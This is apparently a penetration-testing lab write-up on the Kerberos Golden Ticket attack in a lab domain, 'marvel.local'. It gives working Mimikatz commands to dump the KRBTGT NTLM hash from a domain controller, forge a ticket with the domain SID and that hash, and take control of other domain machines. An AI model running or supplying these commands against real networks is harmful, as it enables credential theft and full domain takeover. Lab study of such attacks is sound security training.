**Golden Ticket**

If we compromise KRBTGT account, we own the domain. KRBTGT is Kerberos Ticket Granting Ticket

For Golden ticket attack we need KRBTGT NTLM hash and Domain SID

Once we have these, we can generate a Golden Ticket

Lets open Domain Controller and download Mimitaz

***lsadump::lsa /inject /name:krbtgt***

<img width="720" height="611" alt="image" src="https://github.com/user-attachments/assets/0832043d-bf9a-4065-aa18-910884249e4f" />

For Golder ticket we need following

SID of the Domain: S-1–5–21–1796215322–804574847–93425865

NTLM hash of KDC: ecf70bc393b8bb853b39a47b17ce43ad

***kerberos::golden /User:User123 /domain:marvel.local /sid:S-1–5–21–1796215322–804574847–93425865 /krbtgt:ecf70bc393b8bb853b39a47b17ce43ad /id:500 /ptt***

<img width="720" height="282" alt="image" src="https://github.com/user-attachments/assets/1537e669-c0eb-40c6-8277-9d9106bba534" />

***misc::cmd***

<img width="720" height="368" alt="image" src="https://github.com/user-attachments/assets/1f58d5d0-e30a-4728-9364-ba12b0e7ab0e" />

And now we are able to access Punisher machine.

<img width="720" height="479" alt="image" src="https://github.com/user-attachments/assets/462f0460-b192-4a94-a3ce-2d7273ccb611" />

With the help of Golden ticket created on DC, we can control any machine on the Domain.
